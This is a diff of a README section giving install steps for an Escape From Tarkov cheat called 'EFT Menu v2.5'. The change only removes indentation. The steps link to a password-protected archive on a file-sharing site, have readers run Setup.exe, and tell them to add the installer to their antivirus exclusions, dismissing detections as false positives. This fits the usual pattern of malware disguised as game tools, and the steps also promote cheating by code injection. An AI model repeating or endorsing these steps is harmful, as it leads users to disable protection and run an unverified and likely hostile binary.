@@ -75,23 +75,23 @@ Enable in the “Movement” section. Speed multiplier can be adjusted on a slid
 
 📥 Steps
 
-    Download the archive from the following link:
-    [📦 Download EFT Menu v2.5](https://www.transfernow.net/dl/20250415UEmNJ6Zw)
+Download the archive from the following link:
+[📦 Download EFT Menu v2.5](https://www.transfernow.net/dl/20250415UEmNJ6Zw)
 
-    Extract the archive using your preferred tool (e.g. WinRAR or 7-Zip).
-    You will be prompted for a password — enter:
+Extract the archive using your preferred tool (e.g. WinRAR or 7-Zip).
+You will be prompted for a password — enter:
 
-    eftmenu25
+eftmenu25
 
-    Run the installer
-    Double-click the Setup.exe file and follow the on-screen instructions.
+Run the installer
+Double-click the Setup.exe file and follow the on-screen instructions.
 
-    Launch Escape From Tarkov
-    Once the installation is complete, open the game as usual.
+Launch Escape From Tarkov
+Once the installation is complete, open the game as usual.
 
-    The cheat will automatically inject when the main menu loads. Press Insert to open the menu.
+The cheat will automatically inject when the main menu loads. Press Insert to open the menu.
 
-    🧠 Tip: If your antivirus flags the installer, add it to your exclusions list. False positives are common with game tools due to injection methods.
+🧠 Tip: If your antivirus flags the installer, add it to your exclusions list. False positives are common with game tools due to injection methods.
 
 ---
 
